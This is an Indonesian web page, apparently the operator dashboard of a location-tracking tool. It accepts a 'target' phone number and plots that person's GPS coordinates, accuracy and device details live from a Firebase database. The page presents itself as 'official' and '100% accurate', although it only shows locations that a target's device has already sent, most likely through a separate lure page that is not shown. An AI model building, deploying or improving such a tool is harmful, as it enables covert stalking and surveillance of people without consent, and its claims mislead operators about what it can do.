<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Track IP - Dashboard Monitoring</title>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <!-- Leaflet CSS & JS (Peta) -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            background: #0a0a1a;
            color: #fff;
        }

        /* Header */
        .header {
            background: rgba(10, 10, 26, 0.95);
            backdrop-filter: blur(20px);
            padding: 14px 24px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255,255,255,0.05);
            position: sticky;
            top: 0;
            z-index: 100;
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 14px;
        }

        .header-left .logo {
            font-size: 22px;
            font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header-left .status-dot {
            width: 10px;
            height: 10px;
            background: #00ff88;
            border-radius: 50%;
            animation: blink 1s ease-in-out infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.2; }
        }

        .header-left .status-text {
            font-size: 11px;
            color: rgba(255,255,255,0.3);
            font-weight: 500;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
        }

        .header-right .badge {
            background: rgba(0, 212, 255, 0.1);
            padding: 4px 14px;
            border-radius: 20px;
            font-size: 10px;
            color: #00d4ff;
            border: 1px solid rgba(0, 212, 255, 0.1);
            font-weight: 600;
            letter-spacing: 0.5px;
        }

        .header-right .time {
            font-size: 12px;
            color: rgba(255,255,255,0.2);
            font-weight: 300;
        }

        /* Main Layout */
        .main {
            display: flex;
            flex-direction: column;
            height: calc(100vh - 65px);
            padding: 12px;
            gap: 12px;
        }

        @media (min-width: 768px) {
            .main {
                flex-direction: row;
                padding: 16px;
                gap: 16px;
            }
            .sidebar {
                width: 380px;
                flex-shrink: 0;
                max-height: calc(100vh - 100px);
            }
            .map-container {
                flex: 1;
            }
        }

        /* Sidebar */
        .sidebar {
            background: rgba(255, 255, 255, 0.03);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.05);
            border-radius: 16px;
            padding: 20px;
            overflow-y: auto;
        }

        .sidebar-title {
            font-size: 12px;
            font-weight: 600;
            color: rgba(255,255,255,0.3);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            margin-bottom: 16px;
        }

        .sidebar-title i {
            margin-right: 8px;
            color: rgba(0,212,255,0.4);
        }

        /* Form */
        .input-group {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
        }

        .input-group input {
            flex: 1;
            padding: 14px 16px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 12px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }

        .input-group input:focus {
            border-color: rgba(0, 212, 255, 0.3);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.05);
        }

        .input-group input::placeholder {
            color: rgba(255,255,255,0.15);
        }

        .input-group input:disabled {
            opacity: 0.5;
        }

        .input-group button {
            padding: 14px 24px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border: none;
            border-radius: 12px;
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .input-group button:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0, 212, 255, 0.2);
        }

        .input-group button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .input-group button .spinner-btn {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .hint-text {
            font-size: 11px;
            color: rgba(255,255,255,0.12);
            margin-bottom: 16px;
        }

        .hint-text i {
            margin-right: 4px;
        }

        /* Info Panel */
        .info-panel {
            background: rgba(255,255,255,0.02);
            border-radius: 12px;
            padding: 16px;
            margin-top: 12px;
            border: 1px solid rgba(255,255,255,0.03);
            display: none;
        }

        .info-panel.active {
            display: block;
            animation: fadeSlide 0.4s ease;
        }

        @keyframes fadeSlide {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .info-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            padding-bottom: 10px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
        }

        .info-header .title {
            font-weight: 600;
            color: #00d4ff;
            font-size: 14px;
        }

        .info-header .title i {
            margin-right: 8px;
        }

        .info-header .status-badge {
            font-size: 11px;
            padding: 4px 12px;
            border-radius: 20px;
            font-weight: 600;
        }

        .status-badge.online {
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
            border: 1px solid rgba(0, 255, 136, 0.1);
        }

        .status-badge.offline {
            background: rgba(255, 0, 0, 0.1);
            color: #ff6b6b;
            border: 1px solid rgba(255, 0, 0, 0.1);
        }

        .status-badge.waiting {
            background: rgba(255, 217, 61, 0.1);
            color: #ffd93d;
            border: 1px solid rgba(255, 217, 61, 0.1);
        }

        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 13px;
            border-bottom: 1px solid rgba(255,255,255,0.02);
        }

        .info-row:last-child {
            border-bottom: none;
        }

        .info-row .label {
            color: rgba(255,255,255,0.3);
        }

        .info-row .value {
            color: rgba(255,255,255,0.8);
            font-weight: 500;
            font-size: 13px;
        }

        .info-row .value.highlight {
            color: #00d4ff;
        }

        .info-row .value.lat {
            color: #00d4ff;
        }

        .info-row .value.lng {
            color: #7b2ffc;
        }

        /* Map Container */
        .map-container {
            background: rgba(255,255,255,0.02);
            border-radius: 16px;
            border: 1px solid rgba(255,255,255,0.05);
            overflow: hidden;
            position: relative;
            min-height: 300px;
        }

        #map {
            width: 100%;
            height: 100%;
            min-height: 400px;
        }

        /* Map Loading Overlay */
        .map-loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: rgba(255,255,255,0.2);
            font-size: 14px;
            text-align: center;
            z-index: 1;
            pointer-events: none;
        }

        .map-loading i {
            font-size: 30px;
            display: block;
            margin-bottom: 10px;
            color: rgba(0,212,255,0.2);
        }

        /* Toast */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: rgba(10, 10, 26, 0.95);
            backdrop-filter: blur(20px);
            padding: 14px 28px;
            border-radius: 14px;
            border: 1px solid rgba(255,255,255,0.06);
            color: #fff;
            font-size: 14px;
            z-index: 999;
            opacity: 0;
            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            text-align: center;
            max-width: 90%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.5);
            pointer-events: none;
        }

        .toast.show {
            opacity: 1;
            transform: translateX(-50%) translateY(0);
        }

        .toast.success i { color: #00ff88; }
        .toast.error i { color: #ff6b6b; }
        .toast.warning i { color: #ffd93d; }
        .toast.info i { color: #00d4ff; }

        /* Scrollbar */
        .sidebar::-webkit-scrollbar {
            width: 3px;
        }
        .sidebar::-webkit-scrollbar-track {
            background: transparent;
        }
        .sidebar::-webkit-scrollbar-thumb {
            background: rgba(0, 212, 255, 0.15);
            border-radius: 10px;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .header {
                padding: 10px 16px;
            }
            .header-left .logo {
                font-size: 18px;
            }
            .header-right .badge {
                font-size: 9px;
                padding: 3px 10px;
            }
            .header-right .time {
                font-size: 10px;
            }
            .sidebar {
                max-height: 300px;
            }
            #map {
                min-height: 300px;
            }
            .input-group {
                flex-wrap: wrap;
            }
            .input-group button {
                width: 100%;
                justify-content: center;
            }
        }

        @media (max-width: 480px) {
            .main {
                padding: 8px;
                gap: 8px;
            }
            .sidebar {
                padding: 14px;
            }
            .info-row {
                font-size: 12px;
                padding: 5px 0;
            }
        }
    </style>
</head>
<body>

    <!-- Header -->
    <div class="header">
        <div class="header-left">
            <span class="logo">TRACK LOCATION</span>
            <span class="status-dot"></span>
            <span class="status-text">Live Monitoring</span>
        </div>
        <div class="header-right">
            <span class="badge"><i class="fas fa-shield-alt"></i> Resmi</span>
            <span class="time" id="timeDisplay"></span>
        </div>
    </div>

    <!-- Main -->
    <div class="main">
        <!-- Sidebar -->
        <div class="sidebar">
            <div class="sidebar-title">
                <i class="fas fa-search"></i> Lacak Target
            </div>

            <div class="input-group">
                <input type="text" id="phoneInput" placeholder="81234567890" maxlength="13" autocomplete="off">
                <button id="trackBtn"><i class="fas fa-location-dot"></i> Lacak</button>
            </div>

            <div class="hint-text">
                <i class="fas fa-info-circle"></i> Masukkan nomor tanpa 62 (contoh: 81234567890)
            </div>

            <!-- Info Panel -->
            <div class="info-panel" id="infoPanel">
                <div class="info-header">
                    <span class="title"><i class="fas fa-satellite-dish"></i> Status Target</span>
                    <span class="status-badge waiting" id="statusBadge">⏳ Menunggu</span>
                </div>
                <div class="info-row">
                    <span class="label">Nomor</span>
                    <span class="value" id="displayPhone">-</span>
                </div>
                <div class="info-row">
                    <span class="label">Latitude</span>
                    <span class="value lat" id="displayLat">-</span>
                </div>
                <div class="info-row">
                    <span class="label">Longitude</span>
                    <span class="value lng" id="displayLng">-</span>
                </div>
                <div class="info-row">
                    <span class="label">Akurasi</span>
                    <span class="value" id="displayAccuracy">-</span>
                </div>
                <div class="info-row">
                    <span class="label">Terakhir Update</span>
                    <span class="value" id="displayTime">-</span>
                </div>
                <div class="info-row">
                    <span class="label">Device</span>
                    <span class="value" id="displayDevice" style="font-size: 11px; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">-</span>
                </div>
            </div>

            <div style="margin-top: 14px; padding: 12px; background: rgba(255,0,0,0.02); border-radius: 10px; border: 1px solid rgba(255,0,0,0.04);">
                <div style="font-size: 10px; color: rgba(255,255,255,0.15); text-align: center; line-height: 1.6;">
                    <i class="fas fa-shield-halved" style="color: rgba(255,107,107,0.3);"></i>
                    Sistem ini beroperasi dengan 100% akurat
                    dan tolong untuk tidak di salah gunakan
                </div>
            </div>
        </div>

        <!-- Map -->
        <div class="map-container">
            <div class="map-loading" id="mapLoading">
                <i class="fas fa-map"></i>
                <span>Memuat Peta...</span>
            </div>
            <div id="map"></div>
        </div>
    </div>

    <!-- Toast -->
    <div class="toast" id="toast">
        <i class="fas fa-info-circle"></i>
        <span id="toastMessage">Memproses...</span>
    </div>

    <script>
        // ========================================
        // 🔥 KONFIGURASI FIREBASE
        // ========================================
        const firebaseConfig = {
            apiKey: "AIzaSyAhO6Y-MlUSmGba0oEu6mM0rVxMoo8H7ns",
            authDomain: "track-66fb0.firebaseapp.com",
            projectId: "track-66fb0",
            storageBucket: "track-66fb0.firebasestorage.app",
            messagingSenderId: "252010791767",
            appId: "1:252010791767:web:306fb4bec288c05cf3f412",
            measurementId: "G-3GMCD0YJ3J"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ========================================
        // DOM ELEMENTS
        // ========================================
        const phoneInput = document.getElementById('phoneInput');
        const trackBtn = document.getElementById('trackBtn');
        const infoPanel = document.getElementById('infoPanel');
        const statusBadge = document.getElementById('statusBadge');
        const displayPhone = document.getElementById('displayPhone');
        const displayLat = document.getElementById('displayLat');
        const displayLng = document.getElementById('displayLng');
        const displayAccuracy = document.getElementById('displayAccuracy');
        const displayTime = document.getElementById('displayTime');
        const displayDevice = document.getElementById('displayDevice');
        const toast = document.getElementById('toast');
        const toastMessage = document.getElementById('toastMessage');
        const mapLoading = document.getElementById('mapLoading');

        // ========================================
        // VARIABEL
        // ========================================
        let map = null;
        let marker = null;
        let circle = null;
        let isTracking = false;
        let currentPhone = null;
        let locationListener = null;
        let hasLocationData = false;
        let mapInitialized = false;

        // ========================================
        // PETA
        // ========================================
        function initMap() {
            if (mapInitialized) return;
            
            map = L.map('map', {
                center: [-6.2088, 106.8456],
                zoom: 13,
                zoomControl: true,
                fadeAnimation: true,
                attributionControl: true
            });

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: '© OpenStreetMap',
                maxZoom: 19,
                minZoom: 3
            }).addTo(map);

            // Sembunyikan loading
            mapLoading.style.display = 'none';
            mapInitialized = true;

            // Resize map setelah render
            setTimeout(() => {
                map.invalidateSize();
            }, 300);

            console.log('🗺️ Map initialized');
        }

        // Update marker di peta
        function updateMap(lat, lng, accuracy) {
            if (!map || !mapInitialized) {
                initMap();
            }

            if (!map) return;

            // Hapus marker lama
            if (marker) {
                map.removeLayer(marker);
                marker = null;
            }
            if (circle) {
                map.removeLayer(circle);
                circle = null;
            }

            // Buat marker baru dengan animasi
            const icon = L.divIcon({
                html: `
                    <div style="
                        position: relative;
                        width: 24px;
                        height: 24px;
                    ">
                        <div style="
                            width: 16px;
                            height: 16px;
                            background: #00d4ff;
                            border-radius: 50%;
                            border: 3px solid #fff;
                            box-shadow: 0 0 30px rgba(0,212,255,0.6), 0 0 60px rgba(0,212,255,0.2);
                            position: absolute;
                            top: 50%;
                            left: 50%;
                            transform: translate(-50%, -50%);
                            animation: pulseMarker 1.5s ease-in-out infinite;
                        "></div>
                        <div style="
                            width: 40px;
                            height: 40px;
                            border: 2px solid rgba(0,212,255,0.2);
                            border-radius: 50%;
                            position: absolute;
                            top: 50%;
                            left: 50%;
                            transform: translate(-50%, -50%);
                            animation: rippleMarker 2s ease-out infinite;
                        "></div>
                    </div>
                `,
                iconSize: [24, 24],
                iconAnchor: [12, 12],
                className: 'custom-marker'
            });

            marker = L.marker([lat, lng], { icon }).addTo(map);

            // Circle akurasi
            const radius = accuracy && accuracy < 500 ? accuracy : 30;
            circle = L.circle([lat, lng], {
                radius: radius,
                color: 'rgba(0, 212, 255, 0.3)',
                fillColor: 'rgba(0, 212, 255, 0.05)',
                fillOpacity: 1,
                weight: 1,
                dashArray: null
            }).addTo(map);

            // Zoom ke lokasi
            map.setView([lat, lng], 16, {
                animate: true,
                duration: 0.5
            });

            // Inject CSS animation
            if (!document.getElementById('markerAnimations')) {
                const style = document.createElement('style');
                style.id = 'markerAnimations';
                style.textContent = `
                    @keyframes pulseMarker {
                        0%, 100% { transform: translate(-50%, -50%) scale(1); }
                        50% { transform: translate(-50%, -50%) scale(1.2); }
                    }
                    @keyframes rippleMarker {
                        0% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
                        100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
                    }
                `;
                document.head.appendChild(style);
            }
        }

        // ========================================
        // TOAST
        // ========================================
        function showToast(message, type = 'info') {
            toastMessage.textContent = message;
            toast.className = 'toast show ' + type;
            clearTimeout(toast._timeout);
            toast._timeout = setTimeout(() => {
                toast.className = 'toast';
            }, 4000);
        }

        // ========================================
        // VALIDASI NOMOR
        // ========================================
        function validatePhoneNumber(number) {
            const clean = number.replace(/\s/g, '');
            const regex = /^[0-9]{9,13}$/;
            if (!regex.test(clean)) {
                return { valid: false, message: 'Masukkan 9-13 digit angka' };
            }
            return { valid: true, clean };
        }

        // ========================================
        // MULAI TRACKING
        // ========================================
        function startTracking(phoneNumber) {
            // Hentikan tracking sebelumnya
            if (locationListener) {
                locationListener.off();
                locationListener = null;
            }

            // Hapus marker lama
            if (marker) {
                map.removeLayer(marker);
                marker = null;
            }
            if (circle) {
                map.removeLayer(circle);
                circle = null;
            }

            currentPhone = phoneNumber;
            isTracking = true;
            hasLocationData = false;

            // Update UI
            trackBtn.disabled = true;
            trackBtn.innerHTML = '<span class="spinner-btn"></span> Menunggu...';
            infoPanel.classList.add('active');
            displayPhone.textContent = phoneNumber;
            statusBadge.className = 'status-badge waiting';
            statusBadge.textContent = '⏳ Menunggu Data';
            displayLat.textContent = '-';
            displayLng.textContent = '-';
            displayAccuracy.textContent = '-';
            displayTime.textContent = '-';
            displayDevice.textContent = '-';

            showToast('📡 Menunggu data dari target...', 'warning');

            // ========================================
            // LISTENER REAL-TIME DARI FIREBASE
            // ========================================
            const locationRef = database.ref('locations/' + phoneNumber);
            
            locationListener = locationRef.on('value', (snapshot) => {
                const data = snapshot.val();
                
                if (!data) {
                    // Belum ada data
                    statusBadge.className = 'status-badge waiting';
                    statusBadge.textContent = '⏳ Menunggu Data';
                    if (!hasLocationData) {
                        showToast('⏳ Menunggu target mengirim lokasi...', 'warning');
                    }
                    return;
                }

                // ========================================
                // DATA DITERIMA - UPDATE SEMUA
                // ========================================
                hasLocationData = true;
                
                const lat = data.lat;
                const lng = data.lng;
                const accuracy = data.accuracy || 0;
                const active = data.active === true;
                const timestamp = data.timestamp;
                const device = data.device || '-';

                // Update status badge
                if (active) {
                    statusBadge.className = 'status-badge online';
                    statusBadge.textContent = '🟢 Online';
                } else {
                    statusBadge.className = 'status-badge offline';
                    statusBadge.textContent = '🔴 Offline';
                }

                // Update info panel
                displayLat.textContent = lat ? lat.toFixed(7) : '-';
                displayLng.textContent = lng ? lng.toFixed(7) : '-';
                displayAccuracy.textContent = accuracy ? accuracy.toFixed(1) + ' m' : '-';
                displayDevice.textContent = device || '-';

                if (timestamp) {
                    const date = new Date(timestamp);
                    const timeStr = date.toLocaleTimeString('id-ID', { 
                        hour: '2-digit', 
                        minute: '2-digit', 
                        second: '2-digit' 
                    });
                    displayTime.textContent = timeStr;
                }

                // ========================================
                // UPDATE PETA JIKA ADA KOORDINAT
                // ========================================
                if (lat && lng && typeof lat === 'number' && typeof lng === 'number') {
                    // Pastikan peta sudah siap
                    if (!mapInitialized) {
                        initMap();
                    }
                    
                    updateMap(lat, lng, accuracy);
                    
                    // Update tombol
                    trackBtn.disabled = false;
                    trackBtn.innerHTML = '<i class="fas fa-sync-alt"></i> Refresh';
                    
                    if (active) {
                        showToast('📍 Lokasi diperbarui', 'success');
                    }
                }

                // Jika tidak aktif dan ada data
                if (!active && hasLocationData) {
                    showToast('⚠️ Target offline', 'warning');
                }

            }, (error) => {
                console.error('Firebase error:', error);
                showToast('❌ Error: ' + error.message, 'error');
                stopTracking();
            });

            // Set offline handler di Firebase
            locationRef.onDisconnect().update({ active: false });
        }

        // ========================================
        // HENTIKAN TRACKING
        // ========================================
        function stopTracking() {
            if (locationListener) {
                locationListener.off();
                locationListener = null;
            }
            isTracking = false;
            currentPhone = null;
            trackBtn.disabled = false;
            trackBtn.innerHTML = '<i class="fas fa-location-dot"></i> Lacak';
            
            if (currentPhone) {
                database.ref('locations/' + currentPhone).update({ active: false })
                    .catch(() => {});
            }
        }

        // ========================================
        // EVENT LISTENER
        // ========================================
        trackBtn.addEventListener('click', function() {
            const rawInput = phoneInput.value.trim();
            
            if (!rawInput) {
                showToast('⚠️ Masukkan nomor target!', 'error');
                phoneInput.focus();
                return;
            }

            const validation = validatePhoneNumber(rawInput);
            if (!validation.valid) {
                showToast('⚠️ ' + validation.message, 'error');
                phoneInput.focus();
                return;
            }

            const phoneNumber = '62' + validation.clean;
            
            // Cek apakah nomor sama dengan yang sedang dilacak
            if (isTracking && currentPhone === phoneNumber) {
                showToast('📡 Masih melacak nomor ini', 'info');
                return;
            }

            // Inisialisasi peta jika belum
            if (!mapInitialized) {
                initMap();
            }

            startTracking(phoneNumber);
        });

        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                trackBtn.click();
            }
        });

        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 13) {
                this.value = this.value.slice(0, 13);
            }
        });

        // ========================================
        // JAM REAL-TIME
        // ========================================
        function updateClock() {
            const now = new Date();
            document.getElementById('timeDisplay').textContent = now.toLocaleTimeString('id-ID');
        }
        setInterval(updateClock, 1000);
        updateClock();

        // ========================================
        // INIT
        // ========================================
        window.addEventListener('DOMContentLoaded', function() {
            // Init map setelah DOM siap
            setTimeout(() => {
                initMap();
                showToast('🌐 Sistem siap melacak', 'success');
                console.log('✅ Track IP System initialized');
                console.log('📱 Firebase connected to:', firebaseConfig.projectId);
                console.log('📍 GPS Settings: enableHighAccuracy=true, timeout=10000, maximumAge=0');
            }, 500);
        });

        // Fix resize
        window.addEventListener('resize', function() {
            if (map && mapInitialized) {
                setTimeout(() => {
                    map.invalidateSize();
                }, 200);
            }
        });

        // Hentikan tracking saat page ditutup
        window.addEventListener('beforeunload', function() {
            if (locationListener) {
                locationListener.off();
            }
            if (currentPhone) {
                database.ref('locations/' + currentPhone).update({ active: false })
                    .catch(() => {});
            }
        });

        console.log('✅ Admin page loaded with high accuracy GPS settings');
        console.log('📍 enableHighAccuracy: true, timeout: 10000, maximumAge: 0');
    </script>
</body>
</html>
